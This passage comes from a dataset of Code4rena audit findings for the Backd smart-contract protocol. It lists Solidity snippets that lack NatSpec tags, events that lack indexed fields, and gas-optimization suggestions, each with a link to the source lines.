`@return`\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol#L201-L208\r\n\r\n```solidity\r\nFile: contracts/actions/topup/TopUpAction.sol   #6\r\n\r\n440      * @param token Address of deposit token that can be used by the action.\r\n441      */\r\n442     function addUsableToken(address token) external override onlyGovernance returns (bool) {\r\n```\r\nMissing: `@return`\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol#L440-L442\r\n\r\n```solidity\r\nFile: contracts/actions/topup/TopUpAction.sol   #7\r\n\r\n802      * @param protocol Protocol where the position is held.\r\n803      */\r\n804     function getPosition(\r\n805         address payer,\r\n806         bytes32 account,\r\n807         bytes32 protocol\r\n808     ) public view override returns (Record memory) {\r\n```\r\nMissing: `@return`\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol#L802-L808\r\n\r\n```solidity\r\nFile: contracts/AddressProvider.sol   #8\r\n\r\n77      * @param action Address of action to add.\r\n78      */\r\n79     function addAction(address action) external onlyGovernance returns (bool) {\r\n```\r\nMissing: `@return`\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/AddressProvider.sol#L77-L79\r\n\r\n```solidity\r\nFile: contracts/AddressProvider.sol   #9\r\n\r\n196     /**\r\n197      * @notice Initializes an address\r\n198      * @param key Key to initialize\r\n199      * @param initialAddress Address for `key`\r\n200      */\r\n201     function initializeAddress(\r\n202         bytes32 key,\r\n203         address initialAddress,\r\n204         bool freezable\r\n205     ) public override onlyGovernance {\r\n```\r\nMissing: `@param freezable`\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/AddressProvider.sol#L196-L205\r\n\r\n```solidity\r\nFile: contracts/AddressProvider.sol   #10\r\n\r\n253     /**\r\n254      * @notice Execute update of `key`\r\n255      * @return New address.\r\n256      */\r\n257     function executeAddress(bytes32 key) external override returns (address) {\r\n```\r\nMissing: `@param key`\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/AddressProvider.sol#L253-L257\r\n\r\n```solidity\r\nFile: contracts/AddressProvider.sol   #11\r\n\r\n263     /**\r\n264      * @notice Reset `key`\r\n265      * @return true if it was reset\r\n266      */\r\n267     function resetAddress(bytes32 key) external onlyGovernance returns (bool) {\r\n```\r\nMissing: `@param key`\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/AddressProvider.sol#L263-L267\r\n\r\n```solidity\r\nFile: contracts/AddressProvider.sol   #12\r\n\r\n385     /**\r\n386      * @notice Tries to get the staker vault for a given token but does not throw if it does not exist\r\n387      * @return A boolean set to true if the vault exists and the vault address.\r\n388      */\r\n389     function tryGetStakerVault(address token) external view override returns (bool, address) {\r\n```\r\nMissing: `@param token`\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/AddressProvider.sol#L385-L389\r\n\r\n```solidity\r\nFile: contracts/Controller.sol   #13\r\n\r\n108     /**\r\n109      * @return the total amount of ETH require by `payer` to cover the fees for\r\n110      * positions registered in all actions\r\n111      */\r\n112     function getTotalEthRequiredForGas(address payer) external view override returns (uint256) {\r\n```\r\nMissing: `@param payer`\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/Controller.sol#L108-L112\r\n\r\n```solidity\r\nFile: contracts/CvxCrvRewardsLocker.sol   #14\r\n\r\n80      * @param _spendRatio New spend ratio to be used.\r\n81      */\r\n82     function setSpendRatio(uint256 _spendRatio) external onlyGovernance returns (bool) {\r\n```\r\nMissing: `@return`\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/CvxCrvRewardsLocker.sol#L80-L82\r\n\r\n```solidity\r\nFile: contracts/CvxCrvRewardsLocker.sol   #15\r\n\r\n95      * @param lockAndStake If true, claimed reward tokens (CRV) will be locked and staked (CRV for cvxCRV and CVX for vlCVX).\r\n96      */\r\n97     function claimRewards(bool lockAndStake) external override returns (bool) {\r\n```\r\nMissing: `@return`\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/CvxCrvRewardsLocker.sol#L95-L97\r\n\r\n```solidity\r\nFile: contracts/CvxCrvRewardsLocker.sol   #16\r\n\r\n158      * @param token Token to withdraw entire balance of.\r\n159      */\r\n160     function withdraw(address token) external onlyGovernance returns (bool) {\r\n```\r\nMissing: `@return`\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/CvxCrvRewardsLocker.sol#L158-L160\r\n\r\n```solidity\r\nFile: contracts/CvxCrvRewardsLocker.sol   #17\r\n\r\n220      * @param amount Amount of token to withdraw.\r\n221      */\r\n222     function withdraw(address token, uint256 amount) public onlyGovernance returns (bool) {\r\n```\r\nMissing: `@return`\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/CvxCrvRewardsLocker.sol#L220-L222\r\n\r\n```solidity\r\nFile: contracts/GasBank.sol   #18\r\n\r\n52     /**\r\n53      * @return the balance of `account`\r\n54      */\r\n55     function balanceOf(address account) external view override returns (uint256) {\r\n```\r\nMissing: `@param account`\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/GasBank.sol#L52-L55\r\n\r\n```solidity\r\nFile: contracts/pool/PoolFactory.sol   #19\r\n\r\n88      * @param implementation of pool implementation to add.\r\n89      */\r\n90     function addPoolImplementation(bytes32 name, address implementation)\r\n91         external\r\n92         onlyGovernance\r\n93         returns (bool)\r\n```\r\nMissing: `@return`\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/pool/PoolFactory.sol#L88-L93\r\n\r\n```solidity\r\nFile: contracts/pool/PoolFactory.sol   #20\r\n\r\n101      * @param implementation of lp token implementation to add.\r\n102      */\r\n103     function addLpTokenImplementation(bytes32 name, address implementation)\r\n104         external\r\n105         onlyGovernance\r\n106         returns (bool)\r\n```\r\nMissing: `@return`\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/pool/PoolFactory.sol#L101-L106\r\n\r\n```solidity\r\nFile: contracts/pool/PoolFactory.sol   #21\r\n\r\n114      * @param implementation of vault implementation to add.\r\n115      */\r\n116     function addVaultImplementation(bytes32 name, address implementation)\r\n117         external\r\n118         onlyGovernance\r\n119         returns (bool)\r\n```\r\nMissing: `@return`\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/pool/PoolFactory.sol#L114-L119\r\n\r\n```solidity\r\nFile: contracts/pool/PoolFactory.sol   #22\r\n\r\n127      * @param implementation of staker vault implementation to add.\r\n128      */\r\n129     function addStakerVaultImplementation(bytes32 name, address implementation)\r\n130         external\r\n131         onlyGovernance\r\n132         returns (bool)\r\n```\r\nMissing: `@return`\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/pool/PoolFactory.sol#L127-L132\r\n\r\n```solidity\r\nFile: contracts/pool/PoolFactory.sol   #23\r\n\r\n137     /**\r\n138      * @notice Deploys a new pool and LP token.\r\n139      * @dev Decimals is an argument as not all ERC20 tokens implement the ERC20Detailed interface.\r\n140      *      An implementation where `getUnderlying()` returns the zero address is for ETH pools.\r\n141      * @param poolName Name of the pool.\r\n142      * @param underlying Address of the pool's underlying.\r\n143      * @param lpTokenArgs Arguments to create the LP token for the pool\r\n144      * @param vaultArgs Arguments to create the vault\r\n145      * @param implementationNames Name of the implementations to use\r\n146      * @return addrs Address of the deployed pool, address of the pool's deployed LP token.\r\n147      */\r\n148     function deployPool(\r\n149         string calldata poolName,\r\n150         uint256 depositCap,\r\n151         address underlying,\r\n152         LpTokenArgs calldata lpTokenArgs,\r\n153         VaultArgs calldata vaultArgs,\r\n154         ImplementationNames calldata implementationNames\r\n155     ) external onlyGovernance returns (Addresses memory addrs) {\r\n```\r\nMissing: `@param depositCap`\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/pool/PoolFactory.sol#L137-L155\r\n\r\n```solidity\r\nFile: contracts/pool/PoolFactory.sol   #24\r\n\r\n223      * @param implementation of lp token implementation to add.\r\n224      */\r\n225     function _addImplementation(\r\n226         bytes32 key,\r\n227         bytes32 name,\r\n228         address implementation\r\n229     ) internal returns (bool) {\r\n```\r\nMissing: `@return`\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/pool/PoolFactory.sol#L223-L229\r\n\r\n```solidity\r\nFile: contracts/StakerVault.sol   #25\r\n\r\n87     /**\r\n88      * @notice Registers an address as a strategy to be excluded from token accumulation.\r\n89      * @dev This should be used is a strategy deposits into a stakerVault and should not get gov. tokens.\r\n90      * @return `true` if success.\r\n91      */\r\n92     function addStrategy(address strategy) external override returns (bool) {\r\n```\r\nMissing: `@param strategy`\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/StakerVault.sol#L87-L92\r\n\r\n```solidity\r\nFile: contracts/utils/Preparable.sol   #26\r\n\r\n33     /**\r\n34      * @notice Prepares an uint256 that should be commited to the contract\r\n35      * after `_MIN_DELAY` elapsed\r\n36      * @param value The value to prepare\r\n37      * @return `true` if success.\r\n38      */\r\n39     function _prepare(\r\n40         bytes32 key,\r\n41         uint256 value,\r\n42         uint256 delay\r\n43     ) internal returns (bool) {\r\n```\r\nMissing: `@param key` `@param delay`\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/utils/Preparable.sol#L33-L43\r\n\r\n```solidity\r\nFile: contracts/utils/Preparable.sol   #27\r\n\r\n57     /**\r\n58      * @notice Prepares an address that should be commited to the contract\r\n59      * after `_MIN_DELAY` elapsed\r\n60      * @param value The value to prepare\r\n61      * @return `true` if success.\r\n62      */\r\n63     function _prepare(\r\n64         bytes32 key,\r\n65         address value,\r\n66         uint256 delay\r\n67     ) internal returns (bool) {\r\n```\r\nMissing: `@param key` `@param delay`\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/utils/Preparable.sol#L57-L67\r\n\r\n```solidity\r\nFile: contracts/utils/Preparable.sol   #28\r\n\r\n81     /**\r\n82      * @notice Reset a uint256 key\r\n83      * @return `true` if success.\r\n84      */\r\n85     function _resetUInt256Config(bytes32 key) internal returns (bool) {\r\n```\r\nMissing: `@param key`\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/utils/Preparable.sol#L81-L85\r\n\r\n```solidity\r\nFile: contracts/utils/Preparable.sol   #29\r\n\r\n93     /**\r\n94      * @notice Reset an address key\r\n95      * @return `true` if success.\r\n96      */\r\n97     function _resetAddressConfig(bytes32 key) internal returns (bool) {\r\n```\r\nMissing: `@param key`\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/utils/Preparable.sol#L93-L97\r\n\r\n```solidity\r\nFile: contracts/utils/Preparable.sol   #30\r\n\r\n115     /**\r\n116      * @notice Execute uint256 config update (with time delay enforced).\r\n117      * @dev Needs to be called after the update was prepared. Fails if called before time delay is met.\r\n118      * @return New value.\r\n119      */\r\n120     function _executeUInt256(bytes32 key) internal returns (uint256) {\r\n```\r\nMissing: `@param key`\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/utils/Preparable.sol#L115-L120\r\n\r\n```solidity\r\nFile: contracts/utils/Preparable.sol   #31\r\n\r\n127     /**\r\n128      * @notice Execute address config update (with time delay enforced).\r\n129      * @dev Needs to be called after the update was prepared. Fails if called before time delay is met.\r\n130      * @return New value.\r\n131      */\r\n132     function _executeAddress(bytes32 key) internal returns (address) {\r\n```\r\nMissing: `@param key`\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/utils/Preparable.sol#L127-L132\r\n\r\n```solidity\r\nFile: libraries/AddressProviderHelpers.sol   #32\r\n\r\n15     /**\r\n16      * @return The address of the treasury.\r\n17      */\r\n18     function getTreasury(IAddressProvider provider) internal view returns (address) {\r\n```\r\nMissing: `@param provider`\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/libraries/AddressProviderHelpers.sol#L15-L18\r\n\r\n```solidity\r\nFile: libraries/AddressProviderHelpers.sol   #33\r\n\r\n22     /**\r\n23      * @return The gas bank.\r\n24      */\r\n25     function getGasBank(IAddressProvider provider) internal view returns (IGasBank) {\r\n```\r\nMissing: `@param provider`\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/libraries/AddressProviderHelpers.sol#L22-L25\r\n\r\n```solidity\r\nFile: libraries/AddressProviderHelpers.sol   #34\r\n\r\n29     /**\r\n30      * @return The address of the vault reserve.\r\n31      */\r\n32     function getVaultReserve(IAddressProvider provider) internal view returns (IVaultReserve) {\r\n```\r\nMissing: `@param provider`\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/libraries/AddressProviderHelpers.sol#L29-L32\r\n\r\n```solidity\r\nFile: libraries/AddressProviderHelpers.sol   #35\r\n\r\n36     /**\r\n37      * @return The address of the swapperRegistry.\r\n38      */\r\n39     function getSwapperRegistry(IAddressProvider provider) internal view returns (address) {\r\n```\r\nMissing: `@param provider`\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/libraries/AddressProviderHelpers.sol#L36-L39\r\n\r\n```solidity\r\nFile: libraries/AddressProviderHelpers.sol   #36\r\n\r\n43     /**\r\n44      * @return The oracleProvider.\r\n45      */\r\n46     function getOracleProvider(IAddressProvider provider) internal view returns (IOracleProvider) {\r\n```\r\nMissing: `@param provider`\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/libraries/AddressProviderHelpers.sol#L43-L46\r\n\r\n```solidity\r\nFile: libraries/AddressProviderHelpers.sol   #37\r\n\r\n50     /**\r\n51      * @return the address of the BKD locker\r\n52      */\r\n53     function getBKDLocker(IAddressProvider provider) internal view returns (address) {\r\n```\r\nMissing: `@param provider`\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/libraries/AddressProviderHelpers.sol#L50-L53\r\n\r\n```solidity\r\nFile: libraries/AddressProviderHelpers.sol   #38\r\n\r\n57     /**\r\n58      * @return the address of the BKD locker\r\n59      */\r\n60     function getRoleManager(IAddressProvider provider) internal view returns (IRoleManager) {\r\n```\r\nMissing: `@param provider`\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/libraries/AddressProviderHelpers.sol#L57-L60\r\n\r\n```solidity\r\nFile: libraries/AddressProviderHelpers.sol   #39\r\n\r\n64     /**\r\n65      * @return the controller\r\n66      */\r\n67     function getController(IAddressProvider provider) internal view returns (IController) {\r\n```\r\nMissing: `@param provider`\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/libraries/AddressProviderHelpers.sol#L64-L67\r\n\r\n### 12. Event is missing `indexed` fields\r\nEach `event` should use three `indexed` fields if there are three or more fields\r\n\r\n```solidity\r\nFile: contracts/actions/topup/TopUpActionFeeHandler.sol   #1\r\n\r\n37     event KeeperFeesClaimed(address indexed keeper, address token, uint256 totalClaimed);\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpActionFeeHandler.sol#L37\r\n\r\n```solidity\r\nFile: contracts/actions/topup/TopUpActionFeeHandler.sol   #2\r\n\r\n39     event FeesPayed(\r\n40         address indexed payer,\r\n41         address indexed keeper,\r\n42         address token,\r\n43         uint256 amount,\r\n44         uint256 keeperAmount,\r\n45         uint256 lpAmount\r\n46     );\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpActionFeeHandler.sol#L39-L46\r\n\r\n```solidity\r\nFile: contracts/CvxCrvRewardsLocker.sol   #3\r\n\r\n46     event NewSpendRatio(uint256 newSpendRatio);\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/CvxCrvRewardsLocker.sol#L46\r\n\r\n```solidity\r\nFile: contracts/CvxCrvRewardsLocker.sol   #4\r\n\r\n47     event NewTreasury(address newTreasury);\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/CvxCrvRewardsLocker.sol#L47\r\n\r\n```solidity\r\nFile: contracts/pool/PoolFactory.sol   #5\r\n\r\n75     event NewPool(address pool, address vault, address lpToken, address stakerVault);\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/pool/PoolFactory.sol#L75\r\n\r\n```solidity\r\nFile: contracts/pool/PoolFactory.sol   #6\r\n\r\n76     event NewImplementation(bytes32 key, bytes32 name, address implementation);\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/pool/PoolFactory.sol#L76\r\n\r\n```solidity\r\nFile: contracts/strategies/BkdTriHopCvx.sol   #7\r\n\r\n27     event SetHopImbalanceToleranceIn(uint256 value); // Emitted after a succuessful setting of hop imbalance tolerance in\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/BkdTriHopCvx.sol#L27\r\n\r\n```solidity\r\nFile: contracts/strategies/BkdTriHopCvx.sol   #8\r\n\r\n28     event SetHopImbalanceToleranceOut(uint256 value); // Emitted after a succuessful setting of hop imbalance tolerance out\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/BkdTriHopCvx.sol#L28\r\n\r\n```solidity\r\nFile: contracts/strategies/ConvexStrategyBase.sol   #9\r\n\r\n62     event Withdraw(uint256 amount); // Emitted after a successful withdrawal\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/ConvexStrategyBase.sol#L62\r\n\r\n```solidity\r\nFile: contracts/strategies/ConvexStrategyBase.sol   #10\r\n\r\n63     event WithdrawAll(uint256 amount); // Emitted after successfully withdrwaing all\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/ConvexStrategyBase.sol#L63\r\n\r\n```solidity\r\nFile: contracts/strategies/ConvexStrategyBase.sol   #11\r\n\r\n65     event SetCommunityReserve(address reserve); // Emitted after a succuessful setting of reserve\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/ConvexStrategyBase.sol#L65\r\n\r\n```solidity\r\nFile: contracts/strategies/ConvexStrategyBase.sol   #12\r\n\r\n66     event SetCrvCommunityReserveShare(uint256 value); // Emitted after a succuessful setting of CRV Community Reserve Share\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/ConvexStrategyBase.sol#L66\r\n\r\n```solidity\r\nFile: contracts/strategies/ConvexStrategyBase.sol   #13\r\n\r\n67     event SetCvxCommunityReserveShare(uint256 value); // Emitted after a succuessful setting of CVX Community Reserve Share\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/ConvexStrategyBase.sol#L67\r\n\r\n```solidity\r\nFile: contracts/strategies/ConvexStrategyBase.sol   #14\r\n\r\n68     event SetImbalanceToleranceIn(uint256 value); // Emitted after a succuessful setting of imbalance tolerance in\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/ConvexStrategyBase.sol#L68\r\n\r\n```solidity\r\nFile: contracts/strategies/ConvexStrategyBase.sol   #15\r\n\r\n69     event SetImbalanceToleranceOut(uint256 value); // Emitted after a succuessful setting of imbalance tolerance out\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/ConvexStrategyBase.sol#L69\r\n\r\n```solidity\r\nFile: contracts/strategies/ConvexStrategyBase.sol   #16\r\n\r\n70     event SetStrategist(address strategist); // Emitted after a succuessful setting of strategist\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/ConvexStrategyBase.sol#L70\r\n\r\n```solidity\r\nFile: contracts/strategies/ConvexStrategyBase.sol   #17\r\n\r\n71     event AddRewardToken(address token); // Emitted after successfully adding a new reward token\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/ConvexStrategyBase.sol#L71\r\n\r\n```solidity\r\nFile: contracts/strategies/ConvexStrategyBase.sol   #18\r\n\r\n72     event RemoveRewardToken(address token); // Emitted after successfully removing a reward token\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/ConvexStrategyBase.sol#L72\r\n\r\n```solidity\r\nFile: contracts/strategies/ConvexStrategyBase.sol   #19\r\n\r\n73     event Harvest(uint256 amount); // Emitted after a successful harvest\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/ConvexStrategyBase.sol#L73\r\n\r\n```solidity\r\nFile: contracts/strategies/StrategySwapper.sol   #20\r\n\r\n34     event SetSlippageTolerance(uint256 value); // Emitted after a succuessful setting of slippage tolerance\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/StrategySwapper.sol#L34\r\n\r\n```solidity\r\nFile: contracts/strategies/StrategySwapper.sol   #21\r\n\r\n35     event SetCurvePool(address token, address curvePool); // Emitted after a succuessful setting of a Curve Pool\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/StrategySwapper.sol#L35\r\n\r\n```solidity\r\nFile: contracts/strategies/StrategySwapper.sol   #22\r\n\r\n36     event SetSwapViaUniswap(address token, bool swapViaUniswap); // Emitted after a succuessful setting of swap via Uniswap\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/StrategySwapper.sol#L36",
    "dataSource": {
      "name": "code-423n4/2022-04-backd-findings",
      "repo": "https://github.com/code-423n4/2022-04-backd-findings",
      "url": "https://github.com/code-423n4/2022-04-backd-findings/issues/182"
    }
  },
  {
    "title": "Gas Optimizations",
    "body": "Vulnerability details:\r\n## Gas Optimizations\r\n\r\n### 1. Multiple `address` mappings can be combined into a single `mapping` of an `address` to a `struct`, where appropriate\r\nSaves a storage slot for the mapping. Depending on the circumstances and sizes of types, can avoid a Gsset (20000 gas). Reads and subsequent writes can also be cheaper\r\n\r\n```solidity\r\nFile: contracts/actions/topup/TopUpAction.sol   #1\r\n\r\n162     mapping(address => mapping(bytes32 => mapping(bytes32 => Record))) private _positions;\r\n163\r\n164     mapping(address => RecordMeta[]) internal _userPositions;\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol#L162-L164\r\n\r\n```solidity\r\nFile: contracts/StakerVault.sol   #2\r\n\r\n47     mapping(address => uint256) public balances;\r\n48     mapping(address => uint256) public actionLockedBalances;\r\n49\r\n50     mapping(address => mapping(address => uint256)) internal _allowances;\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/StakerVault.sol#L47-L50\r\n\r\n```solidity\r\nFile: contracts/strategies/StrategySwapper.sol   #3\r\n\r\n31     mapping(address => ICurveSwapEth) public curvePools; // Curve Pool to use for swaps to ETH (if any)\r\n32     mapping(address => bool) public swapViaUniswap; // If Uniswap should be used over Sushiswap for swaps\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/StrategySwapper.sol#L31-L32\r\n\r\n```solidity\r\nFile: contracts/vault/VaultReserve.sol   #4\r\n\r\n22     mapping(address => mapping(address => uint256)) private _balances;\r\n23     mapping(address => uint256) private _lastWithdrawal;\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/vault/VaultReserve.sol#L22-L23\r\n\r\n### 2. State variables only set in the constructor should be declared `immutable`\r\nAvoids a Gsset (20000 gas)\r\n\r\n```solidity\r\nFile: contracts/strategies/BkdTriHopCvx.sol   #1\r\n\r\n25     uint256 public decimalMultiplier; // Used for converting between underlying and LP\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/BkdTriHopCvx.sol#L25\r\n\r\n```solidity\r\nFile: contracts/vault/VaultReserve.sol   #2\r\n\r\n25     uint256 public minWithdrawalDelay;\r\n```\r\nThere currently is no setter function for this variable\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/vault/VaultReserve.sol#L25\r\n\r\n### 3. State variables can be packed into fewer storage slots\r\nIf variables occupying the same slot are both written the same function or by the constructor, avoids a separate Gsset (20000 gas). Reads of the variables can also be cheaper\r\n\r\n```solidity\r\nFile: contracts/vault/VaultStorage.sol   #1\r\n\r\n9     uint256 public currentAllocated;\r\n```\r\nVariable ordering with one fewer slots:\r\n uint256(32):currentAllocated, uint256(32):waitingForRemovalAllocated, uint256(32):totalDebt, address(20):pool, bool(1):strategyActive, user-defined(*):_strategiesWaitingForRemoval\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/vault/VaultStorage.sol#L9\r\n\r\n### 4. State variables should be cached in stack variables rather than re-reading them from storage\r\nThe instances below point to the second access of a state variable within a function. Caching will replace each Gwarmaccess (100 gas) with a much cheaper stack read.\r\nLess obvious fixes/optimizations include having local storage variables of mappings within state variable mappings or mappings within state variable structs, having local storage variables of structs within mappings, or having local caches of state variable contracts/addresses.\r\n\r\n```solidity\r\nFile: contracts/actions/topup/TopUpAction.sol   #1\r\n\r\n236         _positions[msg.sender][account][protocol] = record;\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol#L236\r\n\r\n```solidity\r\nFile: contracts/Controller.sol   #2\r\n\r\n49                 inflationManager.whitelistGauge(lpGauge);\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/Controller.sol#L49\r\n\r\n```solidity\r\nFile: contracts/Controller.sol   #3\r\n\r\n69                 inflationManager.removeStakerVaultFromInflation(stakerVault, lpToken);\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/Controller.sol#L69\r\n\r\n```solidity\r\nFile: contracts/CvxCrvRewardsLocker.sol   #4\r\n\r\n152         emit NewTreasury(treasury);\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/CvxCrvRewardsLocker.sol#L152\r\n\r\n```solidity\r\nFile: contracts/pool/LiquidityPool.sol   #5\r\n\r\n446             staker.unstakeFor(msg.sender, msg.sender, redeemLpTokens - lpBalance_);\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/pool/LiquidityPool.sol#L446\r\n\r\n```solidity\r\nFile: contracts/pool/LiquidityPool.sol   #6\r\n\r\n160             addressProvider.isStakerVault(to, address(lpToken)) ||\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/pool/LiquidityPool.sol#L160\r\n\r\n```solidity\r\nFile: contracts/pool/LiquidityPool.sol   #7\r\n\r\n527         lpToken.mint(account, mintedLp);\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/pool/LiquidityPool.sol#L527\r\n\r\n```solidity\r\nFile: contracts/StakerVault.sol   #8\r\n\r\n331         uint256 oldBal = 